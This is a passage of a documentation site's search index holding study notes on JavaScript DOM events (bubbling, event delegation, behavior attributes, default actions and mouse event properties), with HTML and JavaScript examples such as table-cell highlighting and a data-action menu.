problems.</p> <p>For instance:</p> <ol> <li>We create a nested menu. Each submenu handles clicks on its elements and calls <code>stopPropagation</code> so that the outer menu won\u2019t trigger.</li> <li>Later we decide to catch clicks on the whole window, to track users\u2019 behavior (where people click). Some analytic systems do that. Usually the code uses <code>document.addEventListener('click'\u2026)</code> to catch all clicks.</li> <li>Our analytic won\u2019t work over the area where clicks are stopped by <code>stopPropagation</code>. Sadly, we\u2019ve got a \u201cdead zone\u201d.</li> </ol> <p>There\u2019s usually no real need to prevent the bubbling. A task that seemingly requires that may be solved by other means. One of them is to use custom events, we\u2019ll cover them later. Also we can write our data into the <code>event</code> object in one handler and read it in another one, so we can pass to handlers on parents information about the processing below.</p> <p>Bubbling and capturing lay the foundation for \u201cevent delegation\u201d \u2013 an extremely powerful event handling pattern.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#event-delegation","title":"Event delegation","text":"<p>Event delegation is of the most powerful event handling patterns.</p> <p>It\u2019s often used to add the same handling for many similar elements, but not only for that.</p> <p>same handling for many similar elements - if we have a lot of elements handled in a similar way, then instead of assigning a handler to each of them \u2013 we put a single handler on their common ancestor.</p> <p>The algorithm:</p> <ol> <li>Put a single handler on the container.</li> <li>In the handler \u2013 check the source element <code>event.target</code>.</li> <li>If the event happened inside an element that interests us, then handle the event.</li> </ol> <p>Benefits:</p> <ul> <li>Simplifies initialization and saves memory: no need to add many handlers.</li> <li>Less code: when adding or removing elements, no need to add/remove handlers.</li> <li>DOM modifications: we can mass add/remove elements with <code>innerHTML</code> and the like.</li> </ul> <p>Limitations:</p> <ul> <li>The event must be bubbling. Some events do not bubble.</li> <li>Low-level handlers should not use <code>event.stopPropagation()</code>.</li> <li>The delegation may add CPU load, because the container-level handler reacts on events in any place of the container, no matter whether they interest us or not. But usually the load is negligible, so we don\u2019t take it into account.</li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#delegation-examples","title":"Delegation examples","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#basic-example-highlight-a-cell-td-on-click","title":"basic example: highlight a cell <code>&lt;td&gt;</code> on click","text":"<pre><code>&lt;!DOCTYPE HTML&gt;\n&lt;html&gt;\n\n&lt;body&gt;\n  &lt;style&gt;\n#bagua-table th {\ntext-align: center;\nfont-weight: bold;\n}\n\n#bagua-table td {\nwidth: 150px;\nwhite-space: nowrap;\ntext-align: center;\nvertical-align: bottom;\npadding-top: 5px;\npadding-bottom: 12px;\n}\n\n#bagua-table .nw {\nbackground: #999;\n}\n\n#bagua-table .n {\nbackground: #03f;\ncolor: #fff;\n}\n\n#bagua-table .ne {\nbackground: #ff6;\n}\n\n#bagua-table .w {\nbackground: #ff0;\n}\n\n#bagua-table .c {\nbackground: #60c;\ncolor: #fff;\n}\n\n#bagua-table .e {\nbackground: #09f;\ncolor: #fff;\n}\n\n#bagua-table .sw {\nbackground: #963;\ncolor: #fff;\n}\n\n#bagua-table .s {\nbackground: #f60;\ncolor: #fff;\n}\n\n#bagua-table .se {\nbackground: #0c3;\ncolor: #fff;\n}\n\n#bagua-table .highlight {\nbackground: red;\n}\n&lt;/style&gt;\n\n  &lt;table id=\"bagua-table\"&gt;\n    &lt;tr&gt;\n      &lt;th colspan=\"3\"&gt;&lt;em&gt;Bagua&lt;/em&gt; Chart: Direction, Element, Color, Meaning&lt;/th&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n      &lt;td class=\"nw\"&gt;&lt;strong&gt;Northwest&lt;/strong&gt;\n        &lt;br&gt;Metal\n        &lt;br&gt;Silver\n        &lt;br&gt;Elders\n      &lt;/td&gt;\n      &lt;td class=\"n\"&gt;&lt;strong&gt;North&lt;/strong&gt;\n        &lt;br&gt;Water\n        &lt;br&gt;Blue\n        &lt;br&gt;Change\n      &lt;/td&gt;\n      &lt;td class=\"ne\"&gt;&lt;strong&gt;Northeast&lt;/strong&gt;\n        &lt;br&gt;Earth\n        &lt;br&gt;Yellow\n        &lt;br&gt;Direction\n      &lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n      &lt;td class=\"w\"&gt;&lt;strong&gt;West&lt;/strong&gt;\n        &lt;br&gt;Metal\n        &lt;br&gt;Gold\n        &lt;br&gt;Youth\n      &lt;/td&gt;\n      &lt;td class=\"c\"&gt;&lt;strong&gt;Center&lt;/strong&gt;\n        &lt;br&gt;All\n        &lt;br&gt;Purple\n        &lt;br&gt;Harmony\n      &lt;/td&gt;\n      &lt;td class=\"e\"&gt;&lt;strong&gt;East&lt;/strong&gt;\n        &lt;br&gt;Wood\n        &lt;br&gt;Blue\n        &lt;br&gt;Future\n      &lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n      &lt;td class=\"sw\"&gt;&lt;strong&gt;Southwest&lt;/strong&gt;\n        &lt;br&gt;Earth\n        &lt;br&gt;Brown\n        &lt;br&gt;Tranquility\n      &lt;/td&gt;\n      &lt;td class=\"s\"&gt;&lt;strong&gt;South&lt;/strong&gt;\n        &lt;br&gt;Fire\n        &lt;br&gt;Orange\n        &lt;br&gt;Fame\n      &lt;/td&gt;\n      &lt;td class=\"se\"&gt;&lt;strong&gt;Southeast&lt;/strong&gt;\n        &lt;br&gt;Wood\n        &lt;br&gt;Green\n        &lt;br&gt;Romance\n      &lt;/td&gt;\n    &lt;/tr&gt;\n\n  &lt;/table&gt;\n\n  &lt;script&gt;\nlet table = document.getElementById('bagua-table');\n\nlet selectedTd;\n\n// code for basic explanation, see after this codeblock\ntable.onclick = function(event) {\nlet td = event.target.closest('td'); // (1)\nif (!td) return; // (2)\nif (!table.contains(td)) return; // (3)\nhighlight(td); // (4)\n};\n\n// more advaced code that do the same as 'table.oncklick = ...' block above\ntable.onclick = function(event) {\nlet target = event.target; // where was the click?\nwhile (target != this) {\nif (target.tagName == 'TD') {\nhighlight(target); // highlight it\nreturn;\n}\n// while we are not on 'TD' we \"level up\" our target variable\n// to the next 'parentNode' until it reaches 'TD' node\ntarget = target.parentNode;\n}\n}\n\nfunction highlight(node) {\nif (selectedTd) { // remove the existing highlight if any\nselectedTd.classList.remove('highlight');\n}\nselectedTd = node;\nselectedTd.classList.add('highlight'); // highlight the new td\n}\n&lt;/script&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> <ol> <li>The method element.closest(selector) returns the nearest ancestor that matches the selector. In our case we look for <code>&lt;td&gt;</code> on the way up from the source element.</li> <li>If <code>event.target</code> is not inside any <code>&lt;td&gt;</code>, then the call returns immediately, as there\u2019s nothing to do.</li> <li>In case of nested tables, <code>event.target</code> may be a <code>&lt;td&gt;</code>, but lying outside of the current table. So we check if that\u2019s actually our table\u2019s <code>&lt;td&gt;</code>.</li> <li>And, if it\u2019s so, then highlight it.</li> </ol> <p>As the result, we have a fast, efficient highlighting code, that doesn\u2019t care about the total number of <code>&lt;td&gt;</code> in the table.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#actions-in-markup","title":"actions in markup","text":"<p>\u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f \u0432 \u0440\u0430\u0437\u043c\u0435\u0442\u043a\u0435</p> <p>Let\u2019s say, we want to make a menu with buttons \u201cSave\u201d, \u201cLoad\u201d, \u201cSearch\u201d and so on. And there\u2019s an object with methods <code>save</code>, <code>load</code>, <code>search</code>\u2026 How to match them? The first idea may be to assign a separate handler to each button. But there\u2019s a more elegant solution. We can add a handler for the whole menu and <code>data-action</code> attributes for buttons that has the method to call. The handler reads the attribute and executes the method.</p> <pre><code>&lt;div id=\"menu\"&gt;\n  &lt;button data-action=\"save\"&gt;Save&lt;/button&gt;\n  &lt;button data-action=\"load\"&gt;Load&lt;/button&gt;\n  &lt;button data-action=\"search\"&gt;Search&lt;/button&gt;\n&lt;/div&gt;\n\n&lt;script&gt;\nclass Menu {\nconstructor(elem) {\nthis._elem = elem; // underscore in '_this.elem' is a naming convention for private vatiables\nelem.onclick = this.onClick.bind(this); // (*)\n}\n\nsave() {\nalert('saving');\n}\n\nload() {\nalert('loading');\n}\n\nsearch() {\nalert('searching');\n}\n\nonClick(event) {\nlet action = event.target.dataset.action;\nif (action) {\nthis[action](); // (**)\n}\n};\n}\n\nnew Menu(menu);\n&lt;/script&gt;\n</code></pre> <p>Please note that <code>this.onClick</code> is bound to <code>this</code> in <code>(*)</code>. That\u2019s important, because otherwise <code>this</code> inside it would reference the DOM element(<code>elem</code>), not the <code>Menu</code> object, and <code>this[action]</code> in (**) would not be what we need.</p> <p>So, what advantages does delegation give us here?</p> <ul> <li>We don\u2019t need to write the code to assign a handler to each button. Just make a method and put it in the markup.</li> <li>The HTML structure is flexible, we can add/remove buttons at any time.</li> </ul> <p>We could also use classes <code>.action-save</code>, <code>.action-load</code>, but an attribute <code>data-action</code> is better semantically. And we can use it in CSS rules too.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#the-behavior-pattern","title":"The \u201cbehavior\u201d pattern","text":"<p>We can also use event delegation to add \u201cbehaviors\u201d to elements declaratively, with special attributes and classes.</p> <p>The pattern has two parts:</p> <ol> <li>We add a custom attribute to an element that describes its behavior.</li> <li>A document-wide handler tracks events, and if an event happens on an attributed element \u2013 performs the action.</li> </ol> <p>The \u201cbehavior\u201d pattern can be an alternative to mini-fragments of JavaScript.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#example-counter","title":"example: counter","text":"<p>Here the attribute <code>data-counter</code> adds a behavior: \u201cincrease value on click\u201d to buttons:</p> <pre><code>Counter: &lt;input type=\"button\" value=\"1\" data-counter&gt;\nOne more counter: &lt;input type=\"button\" value=\"2\" data-counter&gt;\n\n&lt;script&gt;\ndocument.addEventListener('click', function(event) {\n\nif (event.target.dataset.counter != undefined) { // if the attribute exists...\nevent.target.value++;\n}\n\n});\n&lt;/script&gt;\n</code></pre> <p>If we click a button \u2013 its value is increased. Not buttons, but the general approach is important here. There can be as many attributes with <code>data-counter</code> as we want. We can add new ones to HTML at any moment. Using the event delegation we \u201cextended\u201d HTML, added an attribute that describes a new behavior.</p> <p>For document-level handlers \u2013 always use <code>addEventListener</code>.</p> <p>When we assign an event handler to the <code>document</code> object, we should always use <code>addEventListener</code>, not <code>document.on&lt;event&gt;</code>, because the latter will cause conflicts: new handlers overwrite old ones. For real projects it\u2019s normal that there are many handlers on document set by different parts of the code.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#example-toggler","title":"example: toggler","text":"<p>A click on an element with the attribute <code>data-toggle-id</code> will show/hide the element with the given <code>id</code>:</p> <pre><code>&lt;button data-toggle-id=\"subscribe-mail\"&gt;\n  Show the subscription form\n&lt;/button&gt;\n\n&lt;form id=\"subscribe-mail\" hidden&gt;\n  Your mail: &lt;input type=\"email\"&gt;\n&lt;/form&gt;\n\n&lt;script&gt;\ndocument.addEventListener('click', function(event) {\nlet id = event.target.dataset.toggleId;\nif (!id) return;\n\nlet elem = document.getElementById(id);\n\nelem.hidden = !elem.hidden;\n});\n&lt;/script&gt;\n</code></pre> <p>Now, to add toggling functionality to an element no need to write JavaScript for every such element. Just use the behavior, i.e. the attribute <code>data-toggle-id</code>. The document-level handler makes it work for any element of the page. We can combine multiple behaviors on a single element as well.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#browser-default-actions","title":"Browser default actions","text":"<p>There are many default browser actions:</p> <ul> <li><code>mousedown</code> \u2013 starts the selection (move the mouse to select).</li> <li><code>click</code> on <code>&lt;input type=\"checkbox\"&gt;</code> \u2013 checks/unchecks the input.</li> <li><code>contextmenu</code> \u2013 the event happens on a right-click, the action is to show the browser context menu.</li> <li><code>submit</code> \u2013 clicking an <code>&lt;input type=\"submit\"&gt;</code> or hitting Enter inside a form field causes this event to happen, and the browser submits the form after it.</li> <li><code>keydown</code> \u2013 pressing a key may lead to adding a character into a field, or other actions.</li> <li>\u2026there are more\u2026</li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#preventing-browser-actions","title":"Preventing browser actions","text":"<p>All the default actions can be prevented if we want to handle the event exclusively by JavaScript.</p> <p>To prevent a default action:</p> <ul> <li> <p><code>event.preventDefault()</code> - this is the main way</p> </li> <li> <p><code>return false</code> - this way works only for handlers assigned with <code>on&lt;event&gt;</code> element method</p> <p><code>return false</code> is an exception.</p> <p>The value returned by an event handler is usually ignored.</p> <p>The only exception is <code>return false</code> from a handler assigned using <code>on&lt;event&gt;</code>.</p> <p>In all other cases, <code>return</code> value is ignored. In particular, there\u2019s no sense in returning <code>true</code>.</p> </li> </ul> <pre><code>&lt;!-- a click on a link doesn\u2019t lead to navigation; the browser doesn\u2019t do anything --&gt;\n&lt;a href=\"/\" onclick=\"return false\"&gt;Click here&lt;/a&gt;\nor\n&lt;a href=\"/\" onclick=\"event.preventDefault()\"&gt;here&lt;/a&gt;\n</code></pre> <p>Follow-up events.</p> <p>Certain events flow one into another. If we prevent the first event, there will be no second.</p> <p>For instance, <code>mousedown</code> on an <code>&lt;input&gt;</code> field leads to focusing in it, and the <code>focus</code> event. If we prevent the <code>mousedown</code> event, there\u2019s no focus.</p> <p>Stay semantic, don\u2019t abuse. \u0421\u043e\u0445\u0440\u0430\u043d\u044f\u0439\u0442\u0435 \u0441\u0435\u043c\u0430\u043d\u0442\u0438\u043a\u0443, \u043d\u0435 \u0437\u043b\u043e\u0443\u043f\u043e\u0442\u0440\u0435\u0431\u043b\u044f\u0439\u0442\u0435.</p> <p>Technically, by preventing default actions and adding JavaScript we can customize the behavior of any elements. For instance, we can make a link <code>&lt;a&gt;</code> work like a button, and a button <code>&lt;button&gt;</code> behave as a link (redirect to another URL or so).</p> <p>But we should generally keep the semantic meaning of HTML elements. For instance, <code>&lt;a&gt;</code> should perform navigation, not a button.</p> <p>Besides being \u201cjust a good thing\u201d, that makes your HTML better in terms of accessibility.</p> <p>Also if we consider the example with <code>&lt;a&gt;</code>, then please note: a browser allows us to open such links in a new window (by right-clicking them and other means). And people like that. But if we make a button behave as a link using JavaScript and even look like a link using CSS, then <code>&lt;a&gt;</code>-specific browser features still won\u2019t work for it.</p> <pre><code>&lt;input value=\"Focus works\" onfocus=\"this.value=''\"&gt;\n&lt;input onmousedown=\"return false\" onfocus=\"this.value=''\" value=\"Click me\"&gt;\n</code></pre> <p>If the default action was prevented, the value of <code>event.defaultPrevented</code> becomes <code>true</code>, otherwise it\u2019s <code>false</code>.</p> <p>Sometimes we can use <code>event.defaultPrevented</code> instead of using <code>event.stopPropagation()</code>, to signal other event handlers that the event was handled.</p> <p>Example: Preventing default actions of <code>contextmenu</code> for <code>&lt;button&gt;</code> element and also for whole <code>document</code>. The problem is that when we click on elem, we get two menus: the button-level and (the event bubbles up) the document-level menu. Here is the solution:</p> <pre><code>&lt;p&gt;Right-click for the document menu (added a check for event.defaultPrevented)&lt;/p&gt;\n&lt;button id=\"elem\"&gt;Right-click for the button menu&lt;/button&gt;\n\n&lt;script&gt;\nelem.oncontextmenu = function(event) {\nevent.preventDefault();\nalert(\"Button context menu\");\n};\n\ndocument.oncontextmenu = function(event) {\n// solution: check if the default action was prevented?\n// If it is so, then the event was handled, and we don\u2019t need to react on it.\nif (event.defaultPrevented) return;\n\nevent.preventDefault();\nalert(\"Document context menu\");\n};\n&lt;/script&gt;\n</code></pre> <p>If we have nested elements, and each of them has a context menu of its own, that would also work. Just make sure to check for <code>event.defaultPrevented</code> in each <code>contextmenu</code> handler.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#dispatching-custom-eventstodo","title":"Dispatching custom events(TODO)","text":"<p>\u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0445 \u0441\u043e\u0431\u044b\u0442\u0438\u0439</p> <p>TODO: https://javascript.info/dispatch-events</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#ui-events","title":"UI Events","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#mouse-events","title":"Mouse events","text":"<p>Such events may come not only from \u201cmouse devices\u201d.</p> <p>But are also from other devices, such as phones and tablets, where they are emulated for compatibility.</p> <p>Mouse event types:</p> <ol> <li> <p>Simple events:</p> <ul> <li><code>mousedown/mouseup</code> - Mouse button is clicked/released over an element.</li> <li> <p><code>mouseover/mouseout</code> - Mouse pointer comes over/out from an element.     They trigger even when we go from the parent element to a child element.     The browser assumes that the mouse can be only over one element at one time \u2013 the deepest one.     See more on mouseover/out point.</p> </li> <li> <p><code>mouseenter/mouseleave</code> - Mouse pointer enters/leaves the element.     They only trigger when the mouse comes in and out the element as a whole.     Also they do not bubble.     See more on mouseenter/leave point.</p> </li> <li> <p><code>mousemove</code> - Every mouse move over an element triggers that event.</p> <p>A fast mouse move may skip intermediate elements.</p> <p><code>mousemove</code> doesn't trigger on every pixel. The browser checks the mouse position from time to time. That means that if the visitor is moving the mouse very fast then some DOM-elements may be skipped.</p> <p>That\u2019s good for performance, because there may be many intermediate elements. We don\u2019t really want to process in and out of each one.</p> </li> <li> <p><code>contextmenu</code> - Triggers when the right mouse button is pressed. There are other ways to open a context menu, e.g. using a special keyboard key, it triggers in that case also, so it\u2019s not exactly the mouse event.</p> </li> </ul> </li> <li> <p>Complex events(consist of several simple events):</p> <ul> <li><code>click</code> - Triggers after <code>mousedown</code> and then <code>mouseup</code> over the same element if the left mouse button was used.</li> <li><code>dblclick</code> - Triggers after two clicks on the same element within a short timeframe. Rarely used nowadays.</li> </ul> </li> </ol>"},{"location":"Dev/Prg/Langs/Js/Dom/#mouse-event-properties","title":"Mouse event properties","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#mouse-button","title":"mouse button","text":"<ul> <li> <p>event.button - returns the exact mouse button</p> <p>Has following possible values:</p> <ul> <li><code>0</code> - Left button (primary)</li> <li><code>1</code> - Middle button (auxiliary)</li> <li><code>2</code> - Right button (secondary)</li> <li><code>3</code> - X1 button (back)</li> <li><code>4</code> - X2 button (forward)</li> </ul> </li> <li> <p>event.buttons - return all currently pressed buttons as an integer, one bit per button.   In practice this property is very rarely used, you can find details at MDN if you ever need it.</p> </li> <li> <p>event.which - DEPRECATED! An old non-standard way of getting a button, with possible values:</p> <ul> <li><code>event.which == 1</code> \u2013 Left button,</li> <li><code>event.which == 2</code> \u2013 Middle button,</li> <li><code>event.which == 3</code> \u2013 Right button.</li> </ul> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#modifiers-shift-alt-ctrl-and-meta","title":"modifiers: shift, alt, ctrl and meta","text":"<ul> <li><code>shiftKey</code>: Shift</li> <li><code>altKey</code>: Alt (or Option for Mac)</li> <li><code>ctrlKey</code>: Ctrl</li> <li><code>metaKey</code>: Cmd for Mac</li> </ul> <p>They are <code>true</code> if the corresponding key was pressed during the event.</p> <p>For instance, the button below only works on Alt+Shift+ click:</p> <pre><code>&lt;button id=\"button\"&gt;Alt+Shift+Click on me!&lt;/button&gt;\n\n&lt;script&gt;\nbutton.onclick = function(event) {\nif (event.altKey &amp;&amp; event.shiftKey) {\nalert('Hooray!');\n}\n};\n&lt;/script&gt;\n</code></pre> <p>Attention: on Mac it\u2019s usually Cmd instead of Ctrl.</p> <p>Even if we\u2019d like to force Mac users to Ctrl+click \u2013 that\u2019s kind of difficult. The problem is: a left-click with Ctrl is interpreted as a right-click on MacOS, and it generates the contextmenu event, not <code>click</code> like Windows/Linux.</p> <p>So if we want users of all operating systems to feel comfortable, then together with <code>ctrlKey</code> we should check <code>metaKey</code>.</p> <p>For JS-code it means that we should check <code>if (event.ctrlKey || event.metaKey)</code>.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#coordinates","title":"coordinates","text":"<p>All mouse events provide coordinates in two flavours:</p> <ol> <li> <p>Window-relative: <code>clientX</code> and <code>clientY</code>.</p> <p>Are counted from the current window left-upper corner. When the page is scrolled, they change.</p> <p>For instance, if we have a window of the size 500x500, and the mouse is in the left-upper corner, then <code>clientX</code> and <code>clientY</code> are <code>0</code>, no matter how the page is scrolled. And if the mouse is in the center, then <code>clientX</code> and <code>clientY</code> are <code>250</code>, no matter what place in the document it is. They are similar to <code>position:fixed</code> in that aspect. Move the mouse over the input field to see <code>clientX/clientY</code> (the example is in the <code>iframe</code>, so coordinates are relative to that <code>iframe</code>):</p> <pre><code>&lt;input onmousemove=\"this.value=event.clientX+':'+event.clientY\" value=\"Mouse over me\"&gt;\n</code></pre> </li> <li> <p>Document-relative: <code>pageX</code> and <code>pageY</code>.</p> <p>Are counted from the left-upper corner of the document, and do not change when the page is scrolled.</p> </li> </ol>"},{"location":"Dev/Prg/Langs/Js/Dom/#preventing-selection-on-mousedown","title":"Preventing selection on <code>mousedown</code>","text":"<p>Selection cases:</p> <ol> <li> <p>Left mouse holding pressing and moving: makes the selection, often unwanted. TODO: There are multiple ways to prevent the selection, that you can read in https://javascript.info/selection-range.</p> </li> <li> <p>Double mouse click: has a side effect that may be disturbing in some interfaces: it selects text.</p> <p>To prevent selection in this case is to prevent the browser action on <code>mousedown</code>. It prevent first selection case too.</p> <pre><code>Before...\n&lt;b ondblclick=\"alert('Click!')\" onmousedown=\"return false\"&gt;\n  Double-click me\n&lt;/b&gt;\n...After\n</code></pre> <p>Now the bold element is not selected on double clicks, and pressing the left button on it won\u2019t start the selection. The text inside it is still selectable. However, the selection should start not on the text itself, but before or after it. Usually that\u2019s fine for users.</p> </li> </ol> <p>Preventing copying.</p> <p>If we want to disable selection to protect our page content from copy-pasting, then we can use another event: <code>oncopy</code>.</p> <pre><code>&lt;div oncopy=\"alert('Copying forbidden!');return false\"&gt;\n  Dear user,\n  The copying is forbidden for you.\n  If you know JS or HTML, then you can get everything from the page source though.\n&lt;/div&gt;\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/Dom/#moving-the-mouse","title":"Moving the mouse","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#mouseoverout","title":"mouseover/out","text":"<p>The <code>mouseover</code> event occurs when a mouse pointer comes over an element, and <code>mouseout</code> \u2013 when it leaves.</p> <p>If <code>mouseover</code> triggered, there must be <code>mouseout</code>.</p> <p>In case of fast mouse movements, intermediate elements may be ignored, but one thing we know for sure: if the pointer \u201cofficially\u201d entered an element (<code>mouseover</code> event generated), then upon leaving it we always get <code>mouseout</code>.</p> <p>These event have special property <code>event.relatedTarget</code></p> <p>For <code>mouseover</code>:</p> <ul> <li><code>event.target</code> \u2013 is the element where the mouse came over.</li> <li><code>event.relatedTarget</code> \u2013 is the element from which the mouse came (<code>relatedTarget</code> \u2192 <code>target</code>).</li> </ul> <p>For <code>mouseout</code> the reverse:</p> <ul> <li><code>event.target</code> \u2013 is the element that the mouse left.</li> <li><code>event.relatedTarget</code> \u2013 is the new under-the-pointer element, that mouse left for (<code>target</code> \u2192 <code>relatedTarget</code>).</li> </ul> <p><code>event.relatedTarget</code> can be null.</p> <p>That\u2019s normal and just means that the mouse came not from another element, but from out of the window. Or that it left the window. If we access <code>event.relatedTarget.tagName</code>, then there will be an error.</p> <p><code>mouseout</code> when leaving for a child:</p> <p>An important feature of <code>mouseout</code> \u2013 it triggers, when the pointer moves from an element to its descendant(just the same as if it was moving out of the parent element itself), e.g. if we\u2019re on <code>#parent</code> and then move the pointer deeper into <code>#child</code>, we get <code>mouseout</code> on <code>#parent</code> in this HTML:</p> <pre><code>&lt;div id=\"parent\"&gt;\n  &lt;div id=\"child\"&gt;...&lt;/div&gt;\n&lt;/div&gt;\n</code></pre> <p>According to the browser logic: the mouse cursor may be only over a single element at any time \u2013 the most nested one and top by z-index. So if it goes to another element (even a descendant), then it leaves the previous one.</p> <p><code>mouseover</code> when leaving for a child:</p> <p>The <code>mouseover</code> event on a descendant bubbles up. So, if <code>#parent</code> has <code>mouseover</code> handler, it triggers.</p> <p>In the example below moving the mouse from <code>#parent</code> to <code>#child</code>, generates two events on <code>#parent</code>:</p> <ol> <li><code>mouseout [target: parent]</code> (left the parent), then</li> <li><code>mouseover [target: child]</code> (came to the child, bubbled).</li> </ol> <pre><code>&lt;!doctype html&gt;\n&lt;html&gt;\n\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n  &lt;style&gt;\n#parent {\nbackground: #99C0C3;\nwidth: 160px;\nheight: 120px;\nposition: relative;\n}\n\n#child {\nbackground: #FFDE99;\nwidth: 50%;\nheight: 50%;\nposition: absolute;\nleft: 50%;\ntop: 50%;\ntransform: translate(-50%, -50%);\n}\n\ntextarea {\nheight: 140px;\nwidth: 300px;\ndisplay: block;\n}\n&lt;/style&gt;\n\n  &lt;div id=\"parent\" onmouseover=\"mouselog(event)\" onmouseout=\"mouselog(event)\"&gt;parent\n    &lt;div id=\"child\"&gt;child&lt;/div&gt;\n  &lt;/div&gt;\n\n  &lt;textarea id=\"text\"&gt;&lt;/textarea&gt;\n  &lt;input type=\"button\" onclick=\"text.value=''\" value=\"Clear\"&gt;\n\n  &lt;script&gt;\nfunction mouselog(event) {\nlet d = new Date();\ntext.value += `${d.getHours()}:${d.getMinutes()}:${d.getSeconds()} | ${event.type} [target: ${event.target.id}]\\n`.replace(/(:|^)(\\d\\D)/, '$10$2');\ntext.scrollTop = text.scrollHeight;\n}\n&lt;/script&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> <p>If there are some actions upon leaving the parent element, e.g. an animation runs in <code>parent.onmouseout</code>, we usually don\u2019t want it when the pointer just goes deeper into <code>#parent</code>. To avoid it, we can check <code>event.relatedTarget</code> in the handler and, if the mouse is still inside the element, then ignore such event. Alternatively we can use other events: <code>mouseenter</code> and <code>mouseleave</code>, see next point.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#mouseenterleave","title":"mouseenter/leave","text":"<p><code>mouseenter/mouseleave</code> like <code>mouseover/mouseout</code> trigger when the mouse pointer enters/leaves the element.</p> <p>But there are two important differences:</p> <ol> <li>Transitions inside the element, to/from descendants, are not counted.</li> <li>Events <code>mouseenter/mouseleave</code> do not bubble.</li> </ol> <p>So if in the example form previous point above we'll change the events on top element <code>&lt;div id='parent' ... &gt;</code>  from <code>mouseover/mouseout</code> to <code>mouseenter/mouseleave</code>, we'll see that he only generated events are the ones related to moving the pointer in and out of the top element. Nothing happens when the pointer goes to the child and back. Transitions between descendants are ignored.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#event-delegation-example","title":"event delegation example","text":"<p>Highlighting <code>TD</code> elements as the mouse travels across them:</p> <p>Beacuse of limitation of \"not-bubbling\" of the <code>mouseenter/mouseleave</code> events we use <code>mouseover/mouseout</code> events for \"delegation\" event handling pattern.</p> <p>In our case we\u2019d like to handle transitions between table cells <code>&lt;td&gt;</code>: entering a cell and leaving it. Other transitions, such as inside the cell or outside of any cells, don\u2019t interest us. Let\u2019s filter them out.</p> <p>Here\u2019s what we can do:</p> <ul> <li>Remember the currently highlighted <code>&lt;td&gt;</code> in a variable, let\u2019s call it <code>currentElem</code>.</li> <li>On <code>mouseover</code> \u2013 ignore the event if we\u2019re still inside the current <code>&lt;td&gt;</code>.</li> <li>On <code>mouseout</code> \u2013 ignore if we didn\u2019t leave the current <code>&lt;td&gt;</code>.</li> </ul> <pre><code>&lt;!DOCTYPE HTML&gt;\n&lt;html&gt;\n\n&lt;head&gt;\n  &lt;meta charset=\"utf-8\"&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n  &lt;style&gt;\n#text {\ndisplay: block;\nheight: 100px;\nwidth: 456px;\n}\n\n#table th {\ntext-align: center;\nfont-weight: bold;\n}\n\n#table td {\nwidth: 150px;\nwhite-space: nowrap;\ntext-align: center;\nvertical-align: bottom;\npadding-top: 5px;\npadding-bottom: 12px;\ncursor: pointer;\n}\n\n#table .nw {\nbackground: #999;\n}\n\n#table .n {\nbackground: #03f;\ncolor: #fff;\n}\n\n#table .ne {\nbackground: #ff6;\n}\n\n#table .w {\nbackground: #ff0;\n}\n\n#table .c {\nbackground: #60c;\ncolor: #fff;\n}\n\n#table .e {\nbackground: #09f;\ncolor: #fff;\n}\n\n#table .sw {\nbackground: #963;\ncolor: #fff;\n}\n\n#table .s {\nbackground: #f60;\ncolor: #fff;\n}\n\n#table .se {\nbackground: #0c3;\ncolor: #fff;\n}\n\n#table .highlight {\nbackground: red;\n}\n&lt;/style&gt;\n\n  &lt;table id=\"table\"&gt;\n    &lt;tr&gt;\n      &lt;th colspan=\"3\"&gt;&lt;em&gt;Bagua&lt;/em&gt; Chart: Direction, Element, Color, Meaning&lt;/th&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n      &lt;td class=\"nw\"&gt;&lt;strong&gt;Northwest&lt;/strong&gt;\n        &lt;br&gt;Metal\n        &lt;br&gt;Silver\n        &lt;br&gt;Elders\n      &lt;/td&gt;\n      &lt;td class=\"n\"&gt;&lt;strong&gt;North&lt;/strong&gt;\n        &lt;br&gt;Water\n        &lt;br&gt;Blue\n        &lt;br&gt;Change\n      &lt;/td&gt;\n      &lt;td class=\"ne\"&gt;&lt;strong&gt;Northeast&lt;/strong&gt;\n        &lt;br&gt;Earth\n        &lt;br&gt;Yellow\n        &lt;br&gt;Direction\n      &lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n      &lt;td class=\"w\"&gt;&lt;strong&gt;West&lt;/strong&gt;\n        &lt;br&gt;Metal\n        &lt;br&gt;Gold\n        &lt;br&gt;Youth\n      &lt;/td&gt;\n      &lt;td class=\"c\"&gt;&lt;strong&gt;Center&lt;/strong&gt;\n        &lt;br&gt;All\n        &lt;br&gt;Purple\n        &lt;br&gt;Harmony\n      &lt;/td&gt;\n      &lt;td class=\"e\"&gt;&lt;strong&gt;East&lt;/strong&gt;\n        &lt;br&gt;Wood\n        &lt;br&gt;Blue\n        &lt;br&gt;Future\n      